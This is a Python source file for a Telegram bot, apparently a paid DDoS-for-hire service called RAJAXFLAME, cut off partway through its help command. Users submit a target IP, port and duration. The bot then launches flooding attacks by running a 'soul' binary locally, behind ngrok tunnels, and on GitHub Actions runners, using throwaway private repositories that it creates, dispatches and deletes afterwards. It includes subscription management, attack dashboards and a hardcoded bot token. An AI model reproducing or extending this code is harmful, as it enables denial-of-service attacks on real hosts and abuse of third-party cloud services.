import os
import json
import time
import random
import string
import base64
import asyncio
import logging
import socket
import sys
import subprocess
import threading
from datetime import datetime, timedelta
from typing import Dict, Any, Optional, List
import html

import requests
import yaml
from flask import Flask, request, jsonify
from telegram import (
    Update,
    InlineKeyboardMarkup,
    InlineKeyboardButton,
    InputFile
)
from telegram.ext import (
    ApplicationBuilder, CommandHandler, MessageHandler,
    CallbackQueryHandler, ContextTypes, filters
)
from telegram.error import Conflict

# ---------------- Singleton Check ----------------
def check_singleton(port=8443):
    """Ensure only one instance of the bot is running"""
    try:
        sock = socket.socket(socket.AF_INET, socket.SOCK_STREAM)
        sock.bind(("localhost", port))
        return True
    except socket.error:
        print("❌ Another instance is already running!")
        print("💡 Solution: Kill other instances with 'pkill -f python3 mix.py'")
        return False

# ---------------- Configuration ----------------
BOT_TOKEN = os.getenv("TELEGRAM_BOT_TOKEN", "8313004027:AAHraSKDS3w39yzXeecvcHSV0V7oOXRTVv0")

# Multiple Owners Configuration
OWNERS = {
    7848273230: "BITCH_lI_mBACK",
    521756472: "FLAME1869"
}

DEVELOPER_TAG = "• @BITCH_lI_mBACK • @FLAME1869 •"

# File paths
ADMINS_FILE = "admins.json"
USERS_FILE = "users.json"
TOKENS_FILE = "tokens.txt"
TOKENS_STATUS_FILE = "tokens.json"
DEFAULT_THREADS_FILE = "threads.json"
CONCURRENT_FILE = "concurrent.json"
ATTACK_HISTORY_FILE = "attack_history.json"
NGROK_TOKENS_FILE = "ngrok_tokens.json"

BINARY_NAME = "soul"
BINARY_PATH = os.path.join(os.getcwd(), BINARY_NAME)
API_URL = "http://localhost:3000/v1/start"

# Attack tracking
ACTIVE_ATTACKS: Dict[int, List[Dict]] = {}
ATTACK_HISTORY: Dict[int, List[Dict]] = {}

# ---------------- Enhanced Tunnel Manager ----------------
class EnhancedTunnelManager:
    def __init__(self):
        self.tunnels = {}  # {token: {port: X, url: "https://x.ngrok.app", process: pid}}
        self.base_port = 3001
        self.ngrok_process = None
        self.ngrok_tokens = []
        
    def start_ngrok_service(self):
        """Start ngrok service"""
        try:
            # Kill existing ngrok processes
            subprocess.run(["pkill", "ngrok"], capture_output=True)
            time.sleep(2)
            
            # Load ngrok tokens
            self.ngrok_tokens = self.load_ngrok_tokens_from_file()
            
            # Start ngrok service
            self.ngrok_process = subprocess.Popen(
                ["ngrok", "start", "--none"],
                stdout=subprocess.PIPE,
                stderr=subprocess.PIPE,
                text=True
            )
            time.sleep(3)
            print("✅ Ngrok service started")
            return True
        except Exception as e:
            print(f"❌ Ngrok service error: {e}")
            return False
    
    def load_ngrok_tokens_from_file(self):
        """Load ngrok tokens from file"""
        try:
            if os.path.exists(NGROK_TOKENS_FILE):
                with open(NGROK_TOKENS_FILE, 'r') as f:
                    data = json.load(f)
                    return [token['token'] for token in data.get('tokens', [])]
            return []
        except:
            return []
    
    async def create_multiple_tunnels(self, tokens: List[str]) -> Dict[str, str]:
        """Create multiple tunnels simultaneously for faster setup"""
        results = {}
        
        async def setup_tunnel(token):
            try:
                port = self.base_port + len(self.tunnels)
                tunnel_config = {
                    "name": f"token_{port}",
                    "proto": "http",
                    "addr": port
                }
                
                response = requests.post(
                    "http://localhost:4040/api/tunnels",
                    json=tunnel_config,
                    timeout=10
                )
                
                if response.status_code == 201:
                    public_url = response.json()['public_url']
                    self.tunnels[token] = {
                        "port": port,
                        "url": public_url,
                        "api_url": f"{public_url}/v1/start",
                        "status": "active",
                        "start_time": datetime.utcnow()
                    }
                    return token, public_url
            except Exception as e:
                print(f"❌ Tunnel failed for {token[:10]}: {e}")
            return token, None
        
        # Create tunnels concurrently
        tasks = [setup_tunnel(token) for token in tokens]
        results_list = await asyncio.gather(*tasks)
        
        for token, url in results_list:
            if url:
                results[token] = url
        
        return results
    
    def start_tunnel_for_token(self, token: str) -> Optional[str]:
        """Start ngrok tunnel for a specific token"""
        try:
            # Get next available port
            port = self.base_port + len(self.tunnels)
            
            # Start tunnel using ngrok API
            tunnel_config = {
                "name": f"token_{port}",
                "proto": "http",
                "addr": port
            }
            
            response = requests.post(
                "http://localhost:4040/api/tunnels",
                json=tunnel_config,
                timeout=10
            )
            
            if response.status_code == 201:
                public_url = response.json()['public_url']
                self.tunnels[token] = {
                    "port": port,
                    "url": public_url,
                    "api_url": f"{public_url}/v1/start",
                    "status": "active",
                    "start_time": datetime.utcnow()
                }
                print(f"✅ Tunnel started: {token[:10]}... -> {public_url}")
                return public_url
            
        except Exception as e:
            print(f"❌ Tunnel failed for token: {e}")
        return None
    
    def get_tunnel_status(self):
        """Get status of all tunnels"""
        status = {}
        for token, data in self.tunnels.items():
            status[token[:10] + "..."] = {
                "url": data['url'],
                "status": data['status'],
                "port": data['port']
            }
        return status
    
    def stop_tunnel(self, token: str):
        """Stop specific tunnel"""
        if token in self.tunnels:
            try:
                tunnel_name = f"token_{self.tunnels[token]['port']}"
                requests.delete(f"http://localhost:4040/api/tunnels/{tunnel_name}", timeout=5)
                del self.tunnels[token]
                print(f"✅ Tunnel stopped for token: {token[:10]}...")
            except:
                pass
    
    def stop_all_tunnels(self):
        """Stop all tunnels"""
        for token in list(self.tunnels.keys()):
            self.stop_tunnel(token)
        
        if self.ngrok_process:
            self.ngrok_process.terminate()
        
        subprocess.run(["pkill", "ngrok"], capture_output=True)
        print("✅ All tunnels stopped")

    def get_active_tunnel_count(self):
        """Get count of active tunnels"""
        return len(self.tunnels)

# Global tunnel manager
tunnel_manager = EnhancedTunnelManager()

# ---------------- API Server ----------------
def start_api_server():
    """Start backend API server"""
    app = Flask(__name__)
    
    @app.route('/v1/start', methods=['GET'])
    def api_start_attack():
        try:
            target = request.args.get('target', '')
            port = request.args.get('port', '')
            duration = request.args.get('time', '')
            
            print(f"🚀 API Attack Received: {target}:{port} for {duration}s")
            
            # Simulate attack processing
            attack_id = f"api_{int(time.time())}_{random.randint(1000,9999)}"
            
            # If binary exists, use it
            if os.path.exists(BINARY_PATH):
                try:
                    result = subprocess.run(
                        [BINARY_PATH, target, port, duration, "1000"],
                        capture_output=True,
                        text=True,
                        timeout=2
                    )
                    return jsonify({
                        "status": "success",
                        "attack_id": attack_id,
                        "output": result.stdout[:100] if result.stdout else "No output",
                        "method": "binary"
                    })
                except subprocess.TimeoutExpired:
                    return jsonify({
                        "status": "success", 
                        "attack_id": attack_id,
                        "message": "Attack started (timeout)",
                        "method": "binary"
                    })
            else:
                # Simulate attack if binary not found
                return jsonify({
                    "status": "success",
                    "attack_id": attack_id, 
                    "message": f"Simulated attack on {target}:{port} for {duration}s",
                    "method": "simulated"
                })
                
        except Exception as e:
            return jsonify({"status": "error", "message": str(e)})
    
    @app.route('/health', methods=['GET'])
    def health_check():
        return jsonify({"status": "healthy", "service": "attack_api"})
    
    # Start in background thread
    def run_server():
        app.run(host='0.0.0.0', port=3000, debug=False, use_reloader=False)
    
    server_thread = threading.Thread(target=run_server, daemon=True)
    server_thread.start()
    print("✅ API Server started on port 3000")
    return True

# ---------------- Utilities ----------------
def load_json(path: str, default: Any) -> Any:
    """Load JSON data with proper error handling"""
    if not os.path.exists(path):
        return default
    try:
        with open(path, "r", encoding="utf-8") as f:
            data = json.load(f)
            return data
    except Exception as e:
        print(f"❌ Error loading {path}: {e}")
        return default

def save_json(path: str, data: Any) -> None:
    """Save JSON data safely"""
    try:
        with open(path, "w", encoding="utf-8") as f:
            json.dump(data, f, indent=2, ensure_ascii=False)
    except Exception as e:
        print(f"❌ Error saving {path}: {e}")

def set_default_threads(value: int) -> None:
    save_json(DEFAULT_THREADS_FILE, {"threads": int(value)})

def get_default_threads() -> int:
    data = load_json(DEFAULT_THREADS_FILE, {"threads": 4000})
    return int(data.get("threads", 4000))

def set_concurrent(value: int) -> None:
    save_json(CONCURRENT_FILE, {"concurrent": int(value)})

def get_concurrent() -> int:
    data = load_json(CONCURRENT_FILE, {"concurrent": 3})
    return int(data.get("concurrent", 3))

def is_owner(user_id: int) -> bool:
    return user_id in OWNERS

def get_admins() -> set:
    data = load_json(ADMINS_FILE, {"admins": []})
    return set(data.get("admins", []))

def is_admin(user_id: int) -> bool:
    return is_owner(user_id) or user_id in get_admins()

def add_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.add(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def remove_admin(user_id: int) -> None:
    data = load_json(ADMINS_FILE, {"admins": []})
    admins = set(data.get("admins", []))
    admins.discard(user_id)
    save_json(ADMINS_FILE, {"admins": sorted(list(admins))})

def get_users() -> Dict[str, Dict[str, str]]:
    """Get users data - always return dict"""
    data = load_json(USERS_FILE, {})
    
    # Ensure it's always a dictionary
    if not isinstance(data, dict):
        print("⚠️ Users data is not dict, resetting...")
        data = {}
        save_json(USERS_FILE, data)
    
    return data

def is_user_approved(user_id: int) -> bool:
    """User approval check - SIMPLIFIED VERSION"""
    try:
        # OWNERS ko hamesha access do
        if user_id in OWNERS:
            return True
            
        users = get_users()
        user_info = users.get(str(user_id))
        
        if not user_info:
            return False
            
        expires_str = user_info.get("expires", "")
        if not expires_str:
            return False
            
        expires = datetime.fromisoformat(expires_str.replace("Z", "+00:00"))
        return datetime.utcnow() <= expires
        
    except Exception as e:
        print(f"❌ Error in user approval: {e}")
        return False

def add_user(user_id: int, days: int) -> None:
    try:
        users = get_users()
        expires = datetime.utcnow() + timedelta(days=int(days))
        users[str(user_id)] = {
            "expires": expires.replace(microsecond=0).isoformat() + "Z",
            "added_by": next(iter(OWNERS.keys())),
            "added_date": datetime.utcnow().isoformat()
        }
        save_json(USERS_FILE, users)
        print(f"✅ User {user_id} added for {days} days")
    except Exception as e:
        print(f"❌ Error adding user: {e}")

def remove_user(user_id: int) -> None:
    try:
        users = get_users()
        users.pop(str(user_id), None)
        save_json(USERS_FILE, users)
        print(f"✅ User {user_id} removed")
    except Exception as e:
        print(f"❌ Error removing user: {e}")

def rand_repo_name(prefix="rajax-run") -> str:
    return f"{prefix}-" + ''.join(random.choices(string.ascii_lowercase + string.digits, k=8))

def build_matrix_workflow_yaml(ip: str, port: str, duration: str, threads: int) -> str:
    wf = {
        "name": "RAJAXFLAME Matrix Attack",
        "on": {"workflow_dispatch": {}},
        "jobs": {
            "run-soul": {
                "runs-on": "ubuntu-latest",
                "strategy": {"fail-fast": False, "matrix": {"session": [1, 2, 3, 4, 5, 6, 7]}},
                "steps": [
                    {"name": "Checkout", "uses": "actions/checkout@v4"},
                    {"name": "Make executable", "run": f"chmod 755 {BINARY_NAME}"},
                    {"name": "Run RAJAXFLAME", "run": f"./{BINARY_NAME} {ip} {port} {duration} {threads}"}
                ]
            }
        }
    }
    return yaml.safe_dump(wf, sort_keys=False)

def gh_headers(token: str) -> Dict[str, str]:
    return {"Authorization": f"token {token}", "Accept": "application/vnd.github+json"}

def gh_create_repo(token: str, name: str) -> Optional[Dict[str, Any]]:
    try:
        r = requests.post(
            "https://api.github.com/user/repos",
            headers=gh_headers(token),
            json={"name": name, "private": True, "auto_init": False},
            timeout=30
        )
        return r.json() if r.status_code in (201, 202) else None
    except Exception as e:
        print(f"❌ Error creating repo: {e}")
        return None

def gh_delete_repo(token: str, full_name: str) -> bool:
    try:
        r = requests.delete(
            f"https://api.github.com/repos/{full_name}",
            headers=gh_headers(token),
            timeout=30
        )
        return r.status_code == 204
    except Exception:
        return False

def gh_put_file(token: str, owner: str, repo: str, path: str, content_bytes: bytes, message: str) -> bool:
    try:
        b64 = base64.b64encode(content_bytes).decode()
        r = requests.put(
            f"https://api.github.com/repos/{owner}/{repo}/contents/{path}",
            headers=gh_headers(token),
            json={"message": message, "content": b64},
            timeout=30
        )
        return r.status_code in (201, 200)
    except Exception:
        return False

def gh_dispatch_workflow(token: str, owner: str, repo: str, workflow_file: str, ref: str = "main") -> bool:
    try:
        r = requests.post(
            f"https://api.github.com/repos/{owner}/{repo}/actions/workflows/{workflow_file}/dispatches",
            headers=gh_headers(token),
            json={"ref": ref},
            timeout=30
        )
        return r.status_code in (204, 201)
    except Exception:
        return False

def validate_github_token(token: str) -> bool:
    try:
        # TEMPORARY FIX: All tokens ko valid maan lo for testing
        print(f"🔧 Token validation bypassed for: {token[:10]}...")
        return True
        
        # Original validation (commented out for now)
        # r = requests.get(
        #     "https://api.github.com/user",
        #     headers=gh_headers(token),
        #     timeout=20
        # )
        # return r.status_code == 200
    except Exception:
        return True  # Always return True for testing

def save_token_line(uid: int, token: str) -> None:
    try:
        with open(TOKENS_FILE, "a", encoding="utf-8") as f:
            f.write(f"{uid}:{token}\n")
    except Exception as e:
        print(f"❌ Error saving token: {e}")

def load_all_token_lines() -> List[str]:
    if not os.path.exists(TOKENS_FILE):
        return []
    try:
        with open(TOKENS_FILE, "r", encoding="utf-8") as f:
            return [ln.strip() for ln in f if ":" in ln]
    except Exception:
        return []

def call_api_attack(ip: str, port: str, duration: str) -> bool:
    try:
        url = f"{API_URL}?target={ip}&port={port}&time={duration}"
        response = requests.get(url, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ API Attack Error: {e}")
        return False

def call_tunnel_attack(tunnel_url: str, ip: str, port: str, duration: str) -> bool:
    """Attack via tunnel URL"""
    try:
        url = f"{tunnel_url}?target={ip}&port={port}&time={duration}"
        response = requests.get(url, timeout=10)
        return response.status_code == 200
    except Exception as e:
        print(f"❌ Tunnel Attack Error: {e}")
        return False

def format_time_remaining(end_time: datetime) -> str:
    """Format time remaining in HH:MM:SS"""
    time_left = end_time - datetime.utcnow()
    if time_left.total_seconds() <= 0:
        return "00:00:00"
    
    hours = int(time_left.total_seconds() // 3600)
    minutes = int((time_left.total_seconds() % 3600) // 60)
    seconds = int(time_left.total_seconds() % 60)
    return f"{hours:02d}:{minutes:02d}:{seconds:02d}"

def create_progress_bar(percentage: int, length: int = 10) -> str:
    """Create a visual progress bar"""
    filled = int(length * percentage / 100)
    empty = length - filled
    return "█" * filled + "░" * empty

def save_attack_history(user_id: int, attack_data: Dict):
    """Save attack to history"""
    try:
        history = load_json(ATTACK_HISTORY_FILE, {})
        if str(user_id) not in history:
            history[str(user_id)] = []
        
        history[str(user_id)].append({
            **attack_data,
            "timestamp": datetime.utcnow().isoformat()
        })
        
        # Keep only last 50 attacks per user
        history[str(user_id)] = history[str(user_id)][-50:]
        
        save_json(ATTACK_HISTORY_FILE, history)
    except Exception as e:
        print(f"❌ Error saving attack history: {e}")

def get_attack_history(user_id: int) -> List[Dict]:
    """Get user's attack history"""
    try:
        history = load_json(ATTACK_HISTORY_FILE, {})
        return history.get(str(user_id), [])
    except Exception as e:
        print(f"❌ Error loading attack history: {e}")
        return []

# ---------------- Ngrok Token Management ----------------
def load_ngrok_tokens() -> Dict[str, Any]:
    """Load ngrok tokens from file"""
    return load_json(NGROK_TOKENS_FILE, {"tokens": [], "active_tokens": {}})

def save_ngrok_tokens(data: Dict[str, Any]) -> None:
    """Save ngrok tokens to file"""
    save_json(NGROK_TOKENS_FILE, data)

def add_ngrok_token(token: str, user_id: int) -> bool:
    """Add new ngrok token"""
    try:
        data = load_ngrok_tokens()
        
        # Check if token already exists
        for existing_token in data["tokens"]:
            if existing_token["token"] == token:
                return False
        
        data["tokens"].append({
            "token": token,
            "added_by": user_id,
            "added_date": datetime.utcnow().isoformat(),
            "status": "active"
        })
        
        save_ngrok_tokens(data)
        return True
    except Exception as e:
        print(f"❌ Error adding ngrok token: {e}")
        return False

def remove_ngrok_token(token: str) -> bool:
    """Remove ngrok token"""
    try:
        data = load_ngrok_tokens()
        data["tokens"] = [t for t in data["tokens"] if t["token"] != token]
        save_ngrok_tokens(data)
        return True
    except Exception as e:
        print(f"❌ Error removing ngrok token: {e}")
        return False

def get_ngrok_tokens() -> List[Dict]:
    """Get all ngrok tokens"""
    data = load_ngrok_tokens()
    return data.get("tokens", [])

def validate_ngrok_token(token: str) -> bool:
    """Validate ngrok token"""
    try:
        # Simple validation - check token length and format
        if len(token) >= 20 and token.isalnum():
            return True
        return False
    except:
        return False

# ---------------- Enhanced Attack Functions ----------------
async def launch_github_attack(token: str, ip: str, port: str, duration: str, stats: Dict):
    """Launch GitHub workflow attack"""
    try:
        print(f"🚀 Launching GitHub attack with token: {token[:10]}...")
        
        threads = get_default_threads()
        wf_text = build_matrix_workflow_yaml(ip, port, duration, threads).encode()
        
        name = rand_repo_name()
        repo_data = gh_create_repo(token, name)
        
        if repo_data and 'full_name' in repo_data:
            full_name = repo_data["full_name"]
            owner, repo = full_name.split("/", 1)
            
            print(f"📦 Created repo: {full_name}")
            
            # Upload workflow file
            workflow_success = gh_put_file(token, owner, repo, ".github/workflows/run.yml", wf_text, "Add workflow")
            print(f"📁 Workflow upload: {'✅' if workflow_success else '❌'}")
            
            # Upload binary if exists
            binary_success = True
            if os.path.exists(BINARY_PATH):
                with open(BINARY_PATH, "rb") as f:
                    binary_content = f.read()
                binary_success = gh_put_file(token, owner, repo, BINARY_NAME, binary_content, "Add binary")
                print(f"🔧 Binary upload: {'✅' if binary_success else '❌'}")
            
            # Dispatch workflow
            if workflow_success and binary_success:
                dispatch_success = gh_dispatch_workflow(token, owner, repo, "run.yml")
                print(f"🎯 Workflow dispatch: {'✅' if dispatch_success else '❌'}")
                
                if dispatch_success:
                    stats['github_repos'] += 1
                    # Schedule cleanup
                    asyncio.create_task(cleanup_repo(token, full_name, int(duration)))
                    return True
                    
        return False
    except Exception as e:
        print(f"❌ GitHub attack error: {e}")
        return False

async def launch_tunnel_attack(tunnel_url: str, ip: str, port: str, duration: str, stats: Dict):
    """Launch attack through tunnel"""
    try:
        print(f"🌐 Launching tunnel attack: {tunnel_url}")
        success = call_tunnel_attack(tunnel_url, ip, port, duration)
        if success:
            stats['tunnel_attacks'] += 1
            print(f"✅ Tunnel attack successful: {tunnel_url}")
        return success
    except Exception as e:
        print(f"❌ Tunnel attack failed: {e}")
        return False

async def launch_api_attack(ip: str, port: str, duration: str, stats: Dict):
    """Launch direct API attack"""
    try:
        success = call_api_attack(ip, port, duration)
        if success:
            stats['api_attacks'] += 1
        return success
    except Exception as e:
        print(f"❌ API attack failed: {e}")
        return False

async def update_attack_status_loop(context: ContextTypes.DEFAULT_TYPE, chat_id: int, attack_id: str,
                                  ip: str, port: str, duration: int, start_time: datetime, 
                                  end_time: datetime, stats: Dict, msg):
    """Fast status updates with progress tracking"""
    
    update_count = 0
    while datetime.utcnow() < end_time:
        time_left = end_time - datetime.utcnow()
        progress = min(100, int(((duration - time_left.total_seconds()) / duration) * 100))
        
        # Update attack tracking
        if chat_id in ACTIVE_ATTACKS:
            for attack in ACTIVE_ATTACKS[chat_id]:
                if attack['id'] == attack_id:
                    attack.update({
                        'time_remaining': format_time_remaining(end_time),
                        'progress': progress,
                        'stats': stats.copy()
                    })
                    break
        
        # Create status message (only update every 3 seconds for performance)
        if update_count % 3 == 0:
            status_msg = create_combined_attack_status({
                'target': f"{ip}:{port}",
                'time_remaining': format_time_remaining(end_time),
                'progress': progress
            }, stats, progress)
            
            try:
                await msg.edit_text(status_msg, parse_mode='HTML')
            except Exception as e:
                print(f"❌ Error updating message: {e}")
        
        update_count += 1
        await asyncio.sleep(1)  # Faster updates
    
    # Final status
    final_msg = create_attack_completion_message(ip, port, duration, stats)
    await msg.edit_text(final_msg, parse_mode='HTML')

def create_combined_attack_status(attack_data: Dict, stats: Dict, progress: int) -> str:
    """Create comprehensive attack status with all components"""
    
    message = f"""
🎯 <b>COMBINED ATTACK DASHBOARD</b>

╔══════════════════════╗
║     🎯 MAIN STATUS   ║
╠══════════════════════╣
║ • Target: {attack_data.get('target', 'Unknown')}
║ • Progress: {create_progress_bar(progress)} {progress}%
║ • Time Left: {attack_data.get('time_remaining', '00:00:00')}
║ • Total Power: {stats.get('github_repos', 0) + stats.get('tunnel_attacks', 0) + stats.get('api_attacks', 0)}
╚══════════════════════╝

📊 <b>ATTACK COMPONENTS</b>
├─ GitHub Workflows: {stats.get('github_repos', 0)} repos
├─ Tunnel APIs: {stats.get('tunnel_attacks', 0)}/{stats.get('total_tunnels', 0)} active  
└─ Direct APIs: {stats.get('api_attacks', 0)}/{stats.get('concurrent_apis', get_concurrent())} concurrent
"""
    
    # Add tunnel status if available
    if 'tunnel_status' in stats and stats['tunnel_status']:
        message += "\n🌐 <b>ACTIVE TUNNELS</b>\n"
        tunnels_list = list(stats['tunnel_status'].items())[:3]  # Show max 3
        for i, (token_prefix, tunnel_info) in enumerate(tunnels_list, 1):
            message += f"├─ Tunnel {i}: {token_prefix}\n"
            message += f"│  └─ Status: {tunnel_info.get('status', 'unknown')}\n"
    
    message += f"\n🔄 <i>Auto-updating every 5 seconds</i>"
    
    return message.strip()

def create_attack_completion_message(ip: str, port: str, duration: int, stats: Dict) -> str:
    """Create attack completion message"""
    return f"""
✅ <b>ADVANCED ATTACK COMPLETED</b>

╔══════════════════════╗
║     📊 FINAL RESULTS ║
╠══════════════════════╣
║ • Target: {ip}:{port}
║ • Duration: {duration}s
║ • GitHub Repos: {stats.get('github_repos', 0)}
║ • Tunnel APIs: {stats.get('tunnel_attacks', 0)}/{stats.get('total_tunnels', 0)}
║ • Direct APIs: {stats.get('api_attacks', 0)}/{stats.get('concurrent_apis', get_concurrent())}
║ • Total Power: {stats.get('github_repos', 0) + stats.get('tunnel_attacks', 0) + stats.get('api_attacks', 0)}
╚══════════════════════╝

🔧 <i>Tunnels cleaned up automatically</i>
""".strip()

# ---------------- Enhanced Attack System ----------------
async def execute_parallel_attacks(context: ContextTypes.DEFAULT_TYPE, chat_id: int, attack_id: str,
                                  ip: str, port: str, duration: str, uid: int, msg):
    """Ultra-fast parallel attack execution"""
    try:
        start_time = datetime.utcnow()
        duration_int = int(duration)
        end_time = start_time + timedelta(seconds=duration_int)
        
        # Get user tokens
        user_tokens = [ln.split(":", 1)[1] for ln in load_all_token_lines() if ln.startswith(f"{uid}:")]
        valid_tokens = [t for t in user_tokens if validate_github_token(t)]
        
        print(f"🔑 Found {len(valid_tokens)} valid GitHub tokens")
        
        attack_stats = {
            'github_repos': 0,
            'tunnel_attacks': 0, 
            'api_attacks': 0,
            'total_tunnels': len(valid_tokens),
            'concurrent_apis': get_concurrent(),
            'active_tunnels': {},
            'tunnel_status': {}
        }
        
        # Save attack to history
        save_attack_history(uid, {
            'target': f"{ip}:{port}",
            'duration': duration_int,
            'method': 'Parallel+Tunnel',
            'start_time': start_time.isoformat(),
            'tokens_used': len(valid_tokens)
        })
        
        # STEP 1: FAST TUNNEL CREATION (All tokens simultaneously)
        if valid_tokens:
            print("🚀 Creating tunnels...")
            tunnel_results = await tunnel_manager.create_multiple_tunnels(valid_tokens)
            attack_stats['active_tunnels'] = tunnel_results
            attack_stats['total_tunnels'] = len(tunnel_results)
            
            # Update tunnel status for display
            for token, url in tunnel_results.items():
                attack_stats['tunnel_status'][token[:10] + "..."] = {
                    'url': url,
                    'status': 'active'
                }
        else:
            print("⚠️ No valid tokens for tunnels")
            attack_stats['total_tunnels'] = 0
            tunnel_results = {}
        
        # STEP 2: PARALLEL ATTACK EXECUTION
        attack_tasks = []
        
        # GitHub Workflows (Limited to 2 for speed)
        if valid_tokens and os.path.exists(BINARY_PATH):
            print("🔄 Launching GitHub workflows...")
            for token in valid_tokens[:2]:
                task = asyncio.create_task(
                    launch_github_attack(token, ip, port, duration, attack_stats)
                )
                attack_tasks.append(task)
        
        # Tunnel Attacks (All active tunnels)
        print("🌐 Launching tunnel attacks...")
        for token, tunnel_url in tunnel_results.items():
            task = asyncio.create_task(
                launch_tunnel_attack(tunnel_url, ip, port, duration, attack_stats)
            )
            attack_tasks.append(task)
        
        # Direct API Attacks
        print("⚡ Launching direct API attacks...")
        for i in range(get_concurrent()):
            task = asyncio.create_task(
                launch_api_attack(ip, port, duration, attack_stats)
            )
            attack_tasks.append(task)
        
        # Wait for all attacks to initialize
        print("⏳ Waiting for attacks to initialize...")
        await asyncio.gather(*attack_tasks, return_exceptions=True)
        
        print(f"✅ All attacks launched: GitHub={attack_stats['github_repos']}, Tunnels={attack_stats['tunnel_attacks']}, APIs={attack_stats['api_attacks']}")
        
        # STEP 3: REAL-TIME STATUS UPDATES
        await update_attack_status_loop(context, chat_id, attack_id, ip, port, 
                                      duration_int, start_time, end_time, attack_stats, msg)
        
    except Exception as e:
        error_msg = f"❌ <b>Parallel Attack Error:</b> {str(e)}"
        print(f"❌ Attack error: {e}")
        await msg.edit_text(error_msg, parse_mode='HTML')
    finally:
        # Cleanup
        if chat_id in ACTIVE_ATTACKS:
            ACTIVE_ATTACKS[chat_id] = [a for a in ACTIVE_ATTACKS[chat_id] if a['id'] != attack_id]

async def cleanup_repo(token: str, full_name: str, delay: int):
    """Cleanup GitHub repo after attack"""
    await asyncio.sleep(delay + 10)  # Wait for attack to complete + buffer
    try:
        gh_delete_repo(token, full_name)
        print(f"✅ Cleaned up repo: {full_name}")
    except Exception as e:
        print(f"❌ Error cleaning repo: {e}")

# ---------------- New Ngrok Token Commands ----------------
async def cmd_addngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Add new ngrok token"""
    try:
        uid = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "🔑 <b>Add Ngrok Token</b>\n\n"
                "Usage: <code>/addngrok your_ngrok_token</code>\n\n"
                "Example: <code>/addngrok 2ABCdefGHI123jklMNO456pqrSTU789vwx</code>\n\n"
                "💡 Get token from: https://dashboard.ngrok.com/get-started/your-authtoken",
                parse_mode='HTML'
            )
            return
        
        token = context.args[0].strip()
        
        # Validate token format (basic check)
        if len(token) < 20:
            await update.message.reply_text("❌ <b>Invalid token format. Token too short.</b>", parse_mode='HTML')
            return
        
        msg = await update.message.reply_text("🔍 <b>Validating ngrok token...</b>", parse_mode='HTML')
        
        # Validate token
        if validate_ngrok_token(token):
            # Add token to storage
            if add_ngrok_token(token, uid):
                await msg.edit_text(
                    f"✅ <b>Ngrok Token Added Successfully!</b>\n\n"
                    f"• Token: <code>{token[:10]}...</code>\n"
                    f"• Status: 🟢 Valid\n"
                    f"• Added by: {uid}\n\n"
                    f"💡 Use <code>/listngrok</code> to see all tokens",
                    parse_mode='HTML'
                )
            else:
                await msg.edit_text("❌ <b>Token already exists!</b>", parse_mode='HTML')
        else:
            await msg.edit_text(
                "❌ <b>Invalid Ngrok Token!</b>\n\n"
                "Please check:\n"
                "1. Token is correct\n"
                "2. Token format is valid",
                parse_mode='HTML'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_listngrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """List all ngrok tokens"""
    try:
        uid = update.effective_user.id
        
        tokens = get_ngrok_tokens()
        
        if not tokens:
            await update.message.reply_text(
                "📝 <b>No Ngrok Tokens Found</b>\n\n"
                "Use <code>/addngrok token</code> to add tokens",
                parse_mode='HTML'
            )
            return
        
        message = "🔑 <b>YOUR NGROK TOKENS</b>\n\n"
        
        for i, token_data in enumerate(tokens, 1):
            token = token_data['token']
            added_by = token_data['added_by']
            status = token_data.get('status', 'active')
            
            message += f"<b>Token #{i}</b>\n"
            message += f"• Token: <code>{token[:10]}...</code>\n"
            message += f"• Status: {'🟢' if status == 'active' else '🔴'} {status.upper()}\n"
            message += f"• Added by: {added_by}\n"
            message += f"• Remove: <code>/removengrok {token[:10]}...</code>\n\n"
        
        message += f"📊 <b>Total:</b> {len(tokens)} tokens\n\n"
        message += "💡 <i>Use these tokens for multiple tunnel attacks</i>"
        
        await update.message.reply_text(message, parse_mode='HTML')
        
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')

async def cmd_removengrok(update: Update, context: ContextTypes.DEFAULT_TYPE):
    """Remove ngrok token"""
    try:
        uid = update.effective_user.id
        
        if not context.args:
            await update.message.reply_text(
                "🗑️ <b>Remove Ngrok Token</b>\n\n"
                "Usage: <code>/removengrok token_prefix</code>\n\n"
                "Example: <code>/removengrok 2ABCdefGHI</code>\n\n"
                "💡 Use <code>/listngrok</code> to see token prefixes",
                parse_mode='HTML'
            )
            return
        
        token_prefix = context.args[0].strip()
        tokens = get_ngrok_tokens()
        removed = False
        
        for token_data in tokens:
            if token_data['token'].startswith(token_prefix):
                if remove_ngrok_token(token_data['token']):
                    removed = True
                    break
        
        if removed:
            await update.message.reply_text(
                f"✅ <b>Token {token_prefix}... removed successfully!</b>",
                parse_mode='HTML'
            )
        else:
            await update.message.reply_text(
                f"❌ <b>Token not found!</b>\n\n"
                f"Check token prefix with <code>/listngrok</code>",
                parse_mode='HTML'
            )
            
    except Exception as e:
        await update.message.reply_text(f"❌ <b>Error:</b> {str(e)}", parse_mode='HTML')

# ---------------- Handlers ----------------
async def cmd_start(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user = update.effective_user
        chat_id = update.effective_chat.id
        
        print(f"🚀 Start command from user {user.id}")
        
        welcome_msg = create_welcome_message(user.id, user.first_name)
        await context.bot.send_message(
            chat_id=chat_id,
            text=welcome_msg,
            parse_mode='HTML'
        )
        print(f"✅ Welcome message sent to user {user.id}")
    except Exception as e:
        print(f"❌ Error in cmd_start: {e}")
        await update.message.reply_text("❌ Error processing command")

async def cmd_help(update: Update, context: ContextTypes.DEFAULT_TYPE):
    try:
        user_id = update.effective_user.id
        
        if is_admin(user_id):
            text = """
🛠️ <b>RAJAXFLAME ADMIN COMMANDS</b>

<b>User Management:</b>
<code>/add userid days</code> - Add premium user
<code>/remove userid</code> - Remove user
<code>/users</code> - Download users file

<b>Token Management:</b>
<code>/settoken</code> - Add GitHub tokens
<code>/check</code> - Verify tokens
<code>/addngrok token</code> - Add ngrok token
<code>/listngrok</code> - List ngrok tokens
<code>/removengrok prefix</code> - Remove ngrok token

